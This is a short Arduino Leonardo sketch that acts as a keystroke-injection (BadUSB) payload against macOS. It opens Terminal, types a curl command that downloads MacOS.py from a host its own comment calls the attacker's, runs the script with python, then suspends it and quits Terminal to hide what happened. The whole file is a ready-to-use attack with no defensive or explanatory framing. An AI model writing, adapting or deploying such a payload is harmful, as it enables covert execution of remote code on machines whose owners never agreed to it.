#define kbd_es_es
#include <phukdlib_leonardo.h>


#define upload "curl http://192.168.8.81:8081/test_mac/MacOS.py -o MacOS.py" // update attacker's IP, port, path to file and output file
#define shell "python MacOS.py" // update .py filename (output file)

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarOSX("terminal"); // open terminal
  Keyboard.press(KEY_RETURN);
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(2000);
  Keyboard.println(upload);
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.println(shell); 
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z'); 
  Keyboard.releaseAll();               // CTRL + Z for interrupt .py 
  delay(1500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();                // COMMAND + Q for close terminal
  delay(1500);
  delay (100500);
}







































